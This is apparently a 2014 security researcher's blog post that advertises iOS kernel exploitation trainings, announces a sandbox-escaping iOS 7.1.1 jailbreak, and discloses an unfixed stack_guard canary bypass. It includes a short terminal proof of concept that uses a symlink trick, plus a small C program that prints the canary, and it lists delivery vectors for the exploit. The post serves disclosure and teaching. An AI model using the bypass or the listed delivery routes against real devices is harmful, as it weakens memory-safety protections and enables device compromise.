g++-4.8 -std=c++11 -O2 -Wall -pedantic -pthread main.cpp && ./a.outiOS 7.1.1 Jailbroken and iOS Kernel Exploitation Trainings
Posted: 2014-06-17 16:33 by Stefan Esser | Auf Deutsch lesen | More posts about Blog iOS Jailbreak Training Kernel Exploitation
Background
For a few years now SektionEins has been performing iOS security research on application and kernel level. Since last year we have started organizing iOS Kernel Exploitation Trainings in various locations around the globe. In these courses we teach the students everything required to know to get started with iOS kernel research and exploitation. Every time we return home after these trainings we have not only shared our knowledge with our students but usually have gained new ideas through discussions with the students.
So after every training we sit down and try to improve the course by creating new examples and adjusting the course to new changes in latest iOS versions. We develop new tools, improve existing tools and try out new exploitation methods against a collection of iOS kernel vulnerabilities we possess. A by-product of these experiments are usually new jailbreaks for the latest iOS versions. Our latest jailbreak for example covers iOS 7.1.1 and is described a bit down below.
Throughout the next weeks we will keep you posted about some of the new tools we are developing for iOS kernel research and exploitation that we share with our students that attend the trainings. If you want to enter the amazing world of iOS kernel exploitation check out our upcoming trainings. If not, continue reading about the iOS 7.1.1 jailbreak below.
Upcoming Trainings
iOS 7 Kernel Exploitation Training at REcon, Montreal, Canada
Dates: 4 Days, 23-26 June 2014
Location: Hyatt Hotel, Montreal, Canada
Instructor: Stefan Esser
Language: English
Capacity: about 10 seats still available
More Info: http://recon.cx/2014/trainingios.html
iOS 7 Kernel Exploitation Training in Frankfurt, Germany
Dates: 5 Days, 21-25 July 2014
Location: Le Meridien Parkhotel, Frankfurt, Germany
Instructor: Stefan Esser
Language: English
Capacity: about 7 seats still available
More Info: https://www.sektioneins.de/en/blog/14-02-17-trainingFrankfurt.html
iOS 7 Kernel Exploitation Training at YOUR COMPANY
Dates: 4 or 5 Days
Location: At your company
Instructor: Stefan Esser
Language: Deutsch / English
Capacity: depends on you
More Info: Ask us for potential dates, locations and prices training@sektioneins.de
iOS 7.1.1 Jailbreak
Today we have shared with the world that we developed a new jailbreak for iOS 7.1.1 by releasing a picture of a jailbroken yellow iPhone 5c at iOS 7.1.1. This jailbreak is a completely reimplemented exploit for an iOS kernel vulnerability that is completely based on an exploitation technique we discuss in our trainings. The discussion of this technique (not this specific vulnerability) was added to our course in March and makes exploitation of this specific kernel bug 99.99% stable. We mainly developed this new exploit in the last days to test the technique in the real world.
You might wonder what is so special about this specific jailbreak. It is the fact that a kernel bug is used that is hidden inside some functionality that can be easily reached even from within the iOS application sandbox. This means that the exploit code can be used to break out of any application that you exploit. This is very different from nearly all of the kernel vulnerabilities used in iOS jailbreaks since iOS 4. There have been only 2 publicly disclosed vulnerabilities that had this power. The first has been used in comex's JailbreakMe3 and the other one is the posix_spawn() vulnerability disclosed by SektionEins during SyScan 2013 and later used by the jailbreak community in the p0sixpwn jailbreak. Potential initial injection vectors for such an exploit are:
exploit against an internal app like MobileSafari
exploit against any vulnerable app from the AppStore
exploit from within a developer/enterprise app
Considering that there is no month without some Safari/WebKit vulnerability becoming public and that many AppStore applications are linking against old and vulnerable libraries it is therefore quite easy to deliver this exploit. Especially because applications downloaded from the AppStore and put into a backup do not go away and can be re-exploited in the future. We will show this within the next few weeks. However because the exploit can also be shipped with a developer or enterprise application anyone with an enterprise certificate could easily roll out this jailbreak to all devices of the enterprise.
iOS 7.1.1 stack_guard Stack Canary Vulnerability
With our iDevices jailbroken at iOS 7.1.1 it was possible for us to check if other vulnerabilities we know about were closed by Apple with the iOS 7.1.1 update. As it turned out we realized that the stack_guard stack canary vulnerability that we publicly disclosed in April 2013 as part of the SyScan 2013 security conference is still unfixed in latest iOS (and also Mac OSX) versions.
The bug in question allows a local attacker to call a target executable in a way that he controls the value of the stack_guard stack canary that is used to stop stack buffer overflow vulnerabilities from being exploitable. This vulnerability therefore renders the stack canary mitigation in iOS useless against local attackers. For iOS this means that local attacks (persistence/untethering) that rely on stack buffer overflows are suddenly exploitable again or easier to exploit, because the attacker can control the value of the stack_guard.
The bug is caused by libc scanning through the apple strings that are passed by the kernel to an executable for the value of the stack_guard canary value. The problem with this implementation is that the path of the executed binary is part of these strings. An attacker can therefore trigger the execution of the binary through e.g. a symbolic link to control this canary.
iPhone:~ root# uname -a
Darwin iPhone 14.0.0 Darwin Kernel Version 14.0.0: Fri Mar 28 21:15:11 PDT 2014; root:xnu-2423.10.70~1/RELEASE_ARM_S5L8950X iPhone5,2 arm N42AP Darwin
iPhone:~ root# sysctl kern.osversion
kern.osversion: 11D201
iPhonestack_guard=0x55446677
iPhone:~ root# ln -sf ../appledump stack_guard\=0x55446677/link
iPhone:~ root# stack_guard\=0x55446677/link
string(0):
string(1):
string(2): stack_guard=0x0b004be3aceda6a7
string(3):
__stack_chk_guard: 0000000055446677
And the corresponding appledump.c is the following code:
extern long __stack_chk_guard[8];
int main(int argc, char **argv, char **envp, char **apple)
{
int i;
for (i=0; apple[i]; i++) {
printf("string(%u): %s\n", i, apple[i]);
}
printf("\n\n__stack_chk_guard: %016lx\n", *(long *)__stack_chk_guard);
}
At the time of writing it is still unknown why Apple hasn't fixed their exploit mitigation for.
Stefan Esser